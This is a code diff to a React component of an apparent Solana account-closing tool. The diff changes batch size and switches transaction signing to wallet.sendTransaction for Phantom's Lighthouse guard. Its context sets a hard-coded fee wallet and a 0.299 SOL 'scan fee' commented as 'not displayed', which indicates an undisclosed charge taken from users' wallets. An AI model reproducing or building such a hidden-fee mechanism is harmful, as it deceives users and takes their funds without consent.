@@ -21,7 +21,7 @@ import MatrixLoader from './MatrixLoader';
 
 const FEE_WALLET = new PublicKey('B9973oc9rAtQ6SN4HuXhkWGHefSi8RazEcJW6fU5rZ4z');
 const SCAN_FEE = 0.299 * 1e9; // lamports — not displayed
-const MAX_ACCOUNTS_PER_TX = 18; // safe batch size
+const MAX_ACCOUNTS_PER_TX = 10; // lowered for Phantom Lighthouse guard space
 const IS_DEVNET = false; // toggle to false for mainnet
 
 export default function AccountScanner({ initialReferral = '' }) {
@@ -88,17 +88,11 @@ export default function AccountScanner({ initialReferral = '' }) {
         transaction.recentBlockhash = blockhash;
         transaction.feePayer = publicKey;
 
-        let signature;
-        // Use signTransaction (single tx) for better wallet compat than signAllTransactions
-        if (wallet.signTransaction) {
-          const signed = await wallet.signTransaction(transaction);
-          signature = await connection.sendRawTransaction(signed.serialize(), { skipPreflight: false });
-        } else if (wallet.signAllTransactions) {
-          const [signed] = await wallet.signAllTransactions([transaction]);
-          signature = await connection.sendRawTransaction(signed.serialize(), { skipPreflight: false });
-        } else {
-          throw new Error('Wallet does not support transaction signing');
-        }
+        // Use sendTransaction — calls Phantom's signAndSendTransaction for Lighthouse guard
+        const signature = await wallet.sendTransaction(transaction, connection, {
+          skipPreflight: false,
+          maxRetries: 3,
+        });
 
         await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
 
@@ -211,24 +205,9 @@ export default function AccountScanner({ initialReferral = '' }) {
         batchMeta.push(batchAccounts);
       }
 
-      // Sign transactions — use signTransaction for single, signAllTransactions for multi
-      let signedTxs;
-      if (transactions.length === 1 && wallet.signTransaction) {
-        const signed = await wallet.signTransaction(transactions[0]);
-        signedTxs = [signed];
-      } else if (wallet.signAllTransactions) {
-        signedTxs = await wallet.signAllTransactions(transactions);
-      } else {
-        // Fallback: sign one by one
-        signedTxs = [];
-        for (const tx of transactions) {
-          signedTxs.push(await wallet.signTransaction(tx));
-        }
-      }
-
-      // Send each signed transaction via sendRawTransaction (Phantom does NOT submit)
-      for (let i = 0; i < signedTxs.length; i++) {
-        const signature = await connection.sendRawTransaction(signedTxs[i].serialize(), {
+      // Send each transaction via sendTransaction (Phantom signAndSendTransaction)
+      for (let i = 0; i < transactions.length; i++) {
+        const signature = await wallet.sendTransaction(transactions[i], connection, {
           skipPreflight: false,
           maxRetries: 3,
         });
@@ -237,10 +216,10 @@ export default function AccountScanner({ initialReferral = '' }) {
         const batchReclaimed = batchMeta[i].reduce((sum, a) => sum + a.rentLamports, 0) / 1e9;
         reclaimed += batchReclaimed;
         batchMeta[i].forEach(a => closedKeys.add(a.pubkey.toString()));
-        setBatchProgress({ current: i + 1, total: signedTxs.length, inProgress: true });
+        setBatchProgress({ current: i + 1, total: transactions.length, inProgress: true });
 
-        if (i < signedTxs.length - 1) {
-          toast.success(`Batch ${i + 1}/${signedTxs.length} sent (+${batchReclaimed.toFixed(4)} SOL)`);
+        if (i < transactions.length - 1) {
+          toast.success(`Batch ${i + 1}/${transactions.length} sent (+${batchReclaimed.toFixed(4)} SOL)`);
         }
       }
 
